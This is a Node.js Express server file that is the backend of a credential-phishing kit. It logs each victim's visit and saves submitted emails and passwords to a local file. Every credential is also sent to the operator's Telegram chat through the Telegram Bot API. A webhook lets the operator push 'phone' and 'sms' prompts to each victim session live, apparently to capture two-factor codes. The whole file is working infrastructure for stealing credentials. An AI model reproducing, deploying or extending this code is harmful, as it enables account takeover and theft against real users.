require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Store session data
const sessions = {};

// Telegram Bot Configuration
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// For Render: Get public URL
const PUBLIC_URL = process.env.PUBLIC_URL || `http://localhost:${PORT}`;

// Send message to Telegram
async function sendToTelegram(message) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram message sent');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

// === API ROUTES ===

// 1. Page visit notification
app.post('/api/visit', async (req, res) => {
    const sessionId = Date.now().toString();
    sessions[sessionId] = { 
        step: 'visited', 
        command: null,
        email: null,
        password: null,
        createdAt: new Date().toISOString()
    };

    await sendToTelegram(`🌐 <b>Page Visited!</b>\nSession: ${sessionId}`);
    res.json({ sessionId });
});

// 2. Email submitted
app.post('/api/email', async (req, res) => {
    const { sessionId, email } = req.body;

    if (sessions[sessionId]) {
        sessions[sessionId].email = email;
        sessions[sessionId].step = 'email_received';
    }

    await sendToTelegram(`📧 <b>Email Entered:</b>\n${email}\nSession: ${sessionId}`);
    res.json({ success: true });
});

// 3. Password submitted
app.post('/api/password', async (req, res) => {
    const { sessionId, password } = req.body;

    if (sessions[sessionId]) {
        sessions[sessionId].password = password;
        sessions[sessionId].step = 'password_received';

        // Log credentials to file
        const logEntry = `[${new Date().toISOString()}] Session: ${sessionId} | Email: ${sessions[sessionId].email || 'N/A'} | Password: ${password}\n`;
        fs.appendFileSync('credentials.log', logEntry);
        console.log('📝 Credentials logged:', logEntry);
    }

    await sendToTelegram(`🔑 <b>Password Entered!</b>\nEmail: ${sessions[sessionId]?.email || 'N/A'}\nPassword: ${password}\nSession: ${sessionId}`);
    res.json({ success: true });
});

// 4. Check for command (polling endpoint)
app.get('/api/command/:sessionId', (req, res) => {
    const { sessionId } = req.params;

    if (!sessions[sessionId]) {
        return res.json({ command: null });
    }

    const command = sessions[sessionId].command;

    // Clear command after sending
    if (command) {
        sessions[sessionId].command = null;
    }

    res.json({ command });
});

// 5. Set command from Telegram (webhook)
app.post('/api/set-command', (req, res) => {
    const { sessionId, command } = req.body;

    if (sessions[sessionId]) {
        sessions[sessionId].command = command;
        console.log(`✅ Command set for ${sessionId}: ${command}`);
    }

    res.json({ success: true });
});

// 6. Telegram Webhook
app.post('/webhook', async (req, res) => {
    const { message } = req.body;

    if (message && message.text) {
        const text = message.text;
        const chatId = message.chat.id;

        // Only respond to your chat ID
        if (chatId.toString() !== CHAT_ID) {
            return res.sendStatus(200);
        }

        // Parse command: /set [sessionId] [command]
        const parts = text.split(' ');
        if (parts[0] === '/set' && parts.length === 3) {
            const sessionId = parts[1];
            const command = parts[2];

            const validCommands = ['success', 'phone', 'sms', 'notification'];
            if (validCommands.includes(command)) {
                if (sessions[sessionId]) {
                    sessions[sessionId].command = command;
                    await sendToTelegram(`✅ Command <b>${command}</b> set for session <b>${sessionId}</b>`);
                } else {
                    await sendToTelegram(`❌ Session <b>${sessionId}</b> not found`);
                }
            } else {
                await sendToTelegram(`❌ Invalid command. Use: success, phone, sms, or notification`);
            }
        } else {
            await sendToTelegram(`🤖 <b>Available Commands:</b>\n/set [sessionId] [command]\n\nCommands: success, phone, sms, notification\n\nExample: /set 1734567890 success`);
        }
    }

    res.sendStatus(200);
});

// Health check for Render
app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        sessions: Object.keys(sessions).length,
        publicUrl: PUBLIC_URL 
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on ${PUBLIC_URL}`);
    console.log(`📱 Webhook URL: ${PUBLIC_URL}/webhook`);
    console.log(`🔑 Bot Token: ${BOT_TOKEN ? '✅ Set' : '❌ Missing'}`);
    console.log(`👤 Chat ID: ${CHAT_ID ? '✅ Set' : '❌ Missing'}`);
});